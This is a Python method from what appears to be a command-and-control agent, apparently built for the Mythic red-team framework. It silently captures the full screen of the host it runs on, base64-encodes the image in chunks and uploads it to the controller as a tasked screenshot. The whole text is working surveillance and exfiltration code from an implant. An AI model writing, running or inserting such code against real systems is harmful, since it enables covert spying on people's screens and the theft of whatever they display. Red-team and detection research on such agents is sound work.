def screenshot2(self, task_id):
    import io, base64, json
    from datetime import datetime
    from PIL import ImageGrab

    img = ImageGrab.grab()  # captura toda a tela
    buf = io.BytesIO()
    img.save(buf, format="PNG")
    sh_data = buf.getvalue()
    file_size = len(sh_data)

    if file_size > 0:
        total_chunks = int(file_size / CHUNK_SIZE) + (file_size % CHUNK_SIZE > 0)
        data = {
            "action": "post_response", 
            "responses": [
                {
                    "task_id": task_id,
                    "total_chunks": total_chunks,
                    "file_path": str(datetime.now()),
                    "chunk_size": CHUNK_SIZE,
                    "is_screenshot": True 
                }
            ]
        }
        initial_response = self.postMessageAndRetrieveResponse(data)

        for i in range(total_chunks):
            if [task for task in self.taskings if task["task_id"] == task_id][0]["stopped"]:
                return "Job stopped."

            if i == total_chunks - 1:
                content = sh_data[i*CHUNK_SIZE:]
            else:
                content = sh_data[i*CHUNK_SIZE:(i+1)*CHUNK_SIZE]

            data = {
                "action": "post_response", 
                "responses": [
                    {
                        "chunk_num": i+1,
                        "file_id": initial_response["responses"][0]["file_id"],
                        "chunk_data": base64.b64encode(content).decode(),
                        "task_id": task_id                        
                    }
                ]
            }
            self.postMessageAndRetrieveResponse(data)

        return json.dumps({ "file_id": initial_response["responses"][0]["file_id"] })
    else:
        return json.dumps({ "error": "Failed to capture screenshot" })
